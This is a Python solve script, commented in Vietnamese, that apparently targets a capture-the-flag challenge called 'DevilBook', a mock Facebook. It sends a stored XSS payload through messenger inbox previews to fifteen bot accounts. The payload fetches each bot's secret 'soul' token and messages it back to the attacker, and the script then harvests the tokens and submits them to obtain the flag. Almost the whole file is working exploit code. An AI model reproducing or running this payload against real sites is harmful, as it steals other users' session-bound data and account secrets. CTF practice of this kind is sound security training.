#!/usr/bin/env python3
"""facebook (DevilBook) — stored XSS qua ô preview inbox messenger.
Cần: đăng nhập sẵn (cookie trong cj.txt) và contract_key của mình."""
import json, re, time, urllib.request, http.cookiejar

B = "http://103.116.52.180:1710"
ME = "u22423"                                   # username của mình
CK = "contract_2747efd6fbf1a8445d9eb5fd1bd94d8fa7dc"   # lấy ở trang /devil-contract
BOTS = ["ashley_vale","cassian_vale","diego_cross","ezra_vaughn","iris_moon",
        "juno_rae","kai_sterling","luna_hex","marcus_kane","mira_sol",
        "nova_reyes","rowan_ash","silas_crow","vera_nyx","wren_sable"]

cj = http.cookiejar.MozillaCookieJar("cj.txt"); cj.load(ignore_discard=True, ignore_expires=True)
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
def get(p): return json.load(op.open(B + p, timeout=15))
def post(p, d=None):
    r = urllib.request.Request(B + p, data=(json.dumps(d).encode() if d else b"{}"),
                               headers={"Content-Type": "application/json"})
    return json.load(op.open(r, timeout=15))

# 1) Gửi payload XSS cho mỗi bot. Khi bot mở inbox, preview render bằng innerHTML,
#    <img onerror> chạy trong phiên của bot: lấy soul của bot rồi DM ngược về cho mình.
payload = ("<img src=x onerror=\"if(!localStorage.gk){localStorage.gk=1;"
           "fetch('/api/me/soul').then(r=>r.json()).then(d=>"
           "fetch('/api/messages/send',{method:'POST',headers:{'Content-Type':'application/json'},"
           f"body:JSON.stringify({{to:'{ME}',content:'SOUL '+d.username+' '+d.soul}})}}))}}\">")
for b in BOTS:
    post("/api/messages/send", {"to": b, "content": payload})

# 2) Đợi bot đọc inbox, gom soul từ tin nhắn trả về
souls = {}
for _ in range(20):
    time.sleep(6)
    for c in get("/api/messages/conversations")["conversations"]:
        m = re.match(r"SOUL (\S+) (soul_\S+)", c.get("last_message") or "")
        if m: souls[m.group(1)] = m.group(2)
    if len(souls) >= 10: break

# 3) Nộp 10+ soul theo contract_key của mình rồi lấy flag
for s in souls.values():
    post("/api/devil/submit", {"contract_key": CK, "soul": s})
print("flag:", get("/api/devil/flag")["flag"])
